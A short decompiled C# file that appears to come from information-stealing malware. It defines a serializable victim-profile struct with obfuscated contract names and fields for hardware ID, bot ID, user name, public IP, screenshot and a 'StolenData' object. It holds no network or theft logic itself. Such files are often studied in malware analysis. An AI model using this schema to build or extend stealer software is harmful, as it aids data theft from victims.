using System;
using System.Runtime.Serialization;

// Token: 0x0200005B RID: 91
[DataContract(Name = "Entity7", Namespace = "Entity")]
[Serializable]
public struct Entity_CollectedResults
{
	// Token: 0x17000054 RID: 84
	// (get) Token: 0x06000209 RID: 521 RVA: 0x0000399C File Offset: 0x00001B9C
	// (set) Token: 0x0600020A RID: 522 RVA: 0x000039A4 File Offset: 0x00001BA4
	[DataMember(Name = "Id1")]
	public string HWID { get; set; }

	// Token: 0x17000055 RID: 85
	// (get) Token: 0x0600020B RID: 523 RVA: 0x000039AD File Offset: 0x00001BAD
	// (set) Token: 0x0600020C RID: 524 RVA: 0x000039B5 File Offset: 0x00001BB5
	[DataMember(Name = "Id2")]
	public string BotID { get; set; }

	// Token: 0x17000056 RID: 86
	// (get) Token: 0x0600020D RID: 525 RVA: 0x000039BE File Offset: 0x00001BBE
	// (set) Token: 0x0600020E RID: 526 RVA: 0x000039C6 File Offset: 0x00001BC6
	[DataMember(Name = "Id3")]
	public string UserName { get; set; }

	// Token: 0x17000057 RID: 87
	// (get) Token: 0x0600020F RID: 527 RVA: 0x000039CF File Offset: 0x00001BCF
	// (set) Token: 0x06000210 RID: 528 RVA: 0x000039D7 File Offset: 0x00001BD7
	[DataMember(Name = "Id4")]
	public string WindowsVersion { get; set; }

	// Token: 0x17000058 RID: 88
	// (get) Token: 0x06000211 RID: 529 RVA: 0x000039E0 File Offset: 0x00001BE0
	// (set) Token: 0x06000212 RID: 530 RVA: 0x000039E8 File Offset: 0x00001BE8
	[DataMember(Name = "Id5")]
	public string InputLanguage { get; set; }

	// Token: 0x17000059 RID: 89
	// (get) Token: 0x06000213 RID: 531 RVA: 0x000039F1 File Offset: 0x00001BF1
	// (set) Token: 0x06000214 RID: 532 RVA: 0x000039F9 File Offset: 0x00001BF9
	[DataMember(Name = "Id6")]
	public string MonitorSize { get; set; }

	// Token: 0x1700005A RID: 90
	// (get) Token: 0x06000215 RID: 533 RVA: 0x00003A02 File Offset: 0x00001C02
	// (set) Token: 0x06000216 RID: 534 RVA: 0x00003A0A File Offset: 0x00001C0A
	[DataMember(Name = "Id7")]
	public Entity_StolenData StolenData { get; set; }

	// Token: 0x1700005B RID: 91
	// (get) Token: 0x06000217 RID: 535 RVA: 0x00003A13 File Offset: 0x00001C13
	// (set) Token: 0x06000218 RID: 536 RVA: 0x00003A1B File Offset: 0x00001C1B
	[DataMember(Name = "Id8")]
	public string Id8 { get; set; }

	// Token: 0x1700005C RID: 92
	// (get) Token: 0x06000219 RID: 537 RVA: 0x00003A24 File Offset: 0x00001C24
	// (set) Token: 0x0600021A RID: 538 RVA: 0x00003A2C File Offset: 0x00001C2C
	[DataMember(Name = "Id9")]
	public string Id9 { get; set; }

	// Token: 0x1700005D RID: 93
	// (get) Token: 0x0600021B RID: 539 RVA: 0x00003A35 File Offset: 0x00001C35
	// (set) Token: 0x0600021C RID: 540 RVA: 0x00003A3D File Offset: 0x00001C3D
	[DataMember(Name = "Id10")]
	public string TimeZone { get; set; }

	// Token: 0x1700005E RID: 94
	// (get) Token: 0x0600021D RID: 541 RVA: 0x00003A46 File Offset: 0x00001C46
	// (set) Token: 0x0600021E RID: 542 RVA: 0x00003A4E File Offset: 0x00001C4E
	[DataMember(Name = "Id11")]
	public string PublicIP { get; set; }

	// Token: 0x1700005F RID: 95
	// (get) Token: 0x0600021F RID: 543 RVA: 0x00003A57 File Offset: 0x00001C57
	// (set) Token: 0x06000220 RID: 544 RVA: 0x00003A5F File Offset: 0x00001C5F
	[DataMember(Name = "Id12")]
	public byte[] Screenshot { get; set; }

	// Token: 0x17000060 RID: 96
	// (get) Token: 0x06000221 RID: 545 RVA: 0x00003A68 File Offset: 0x00001C68
	// (set) Token: 0x06000222 RID: 546 RVA: 0x00003A70 File Offset: 0x00001C70
	[DataMember(Name = "Id13")]
	public string Id13 { get; set; }

	// Token: 0x17000061 RID: 97
	// (get) Token: 0x06000223 RID: 547 RVA: 0x00003A79 File Offset: 0x00001C79
	// (set) Token: 0x06000224 RID: 548 RVA: 0x00003A81 File Offset: 0x00001C81
	[DataMember(Name = "Id14")]
	public string AppLocation { get; set; }

	// Token: 0x17000062 RID: 98
	// (get) Token: 0x06000225 RID: 549 RVA: 0x00003A8A File Offset: 0x00001C8A
	// (set) Token: 0x06000226 RID: 550 RVA: 0x00003A92 File Offset: 0x00001C92
	[DataMember(Name = "Id15")]
	public bool AlreadySeen { get; set; }
}
